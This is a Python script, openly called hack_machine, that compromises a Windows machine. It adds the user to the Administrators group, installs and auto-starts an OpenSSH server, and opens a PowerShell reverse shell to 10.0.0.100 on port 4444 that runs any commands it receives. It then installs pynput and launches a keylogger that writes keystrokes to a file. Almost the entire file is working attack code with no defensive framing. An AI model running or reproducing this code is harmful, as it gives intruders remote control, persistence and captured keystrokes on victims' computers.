import os
import sys
import subprocess
import ctypes
import platform

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except AttributeError:
        return False

def hack_machine():
    if not is_admin():
        print("This script must be run as an administrator.")
        sys.exit(1)

    subprocess.call(['net', 'localgroup', 'Administrators', os.environ['USERNAME'], '/add'])

    subprocess.call(['powershell', 'Install-WindowsFeature', '-name', 'OpenSSH-Server'])
    subprocess.call(['powershell', 'Start-Service', 'sshd'])
    subprocess.call(['powershell', 'Set-Service', '-Name', 'sshd', '-StartupType', 'Automatic'])

    # Remplacement de la commande nc.exe par la commande PowerShell
    powershell_command = '''
    $client = New-Object System.Net.Sockets.TCPClient('10.0.0.100',4444);
    $stream = $client.GetStream();
    [byte[]]$bytes = 0..65535|%{0};
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        $sendback = (iex $data 2>&1 | Out-String );
        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush()
    };
    $client.Close()
    '''
    subprocess.call(['powershell', '-Command', powershell_command])

    subprocess.call([sys.executable, '-m', 'pip', 'install', 'pynput'])
    keylogger_script = '''
import pynput.keyboard

def on_press(key):
    with open("keylog.txt", "a") as f:
        f.write(str(key))

with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()
    print("Hey you got a keylogger now !!")
'''
    with open("keylogger.py", "w") as f:
        f.write(keylogger_script)
    subprocess.call([sys.executable, 'keylogger.py'])

if __name__ == "__main__":
    if platform.system() != "Windows":
        sys.exit(1)
    hack_machine()
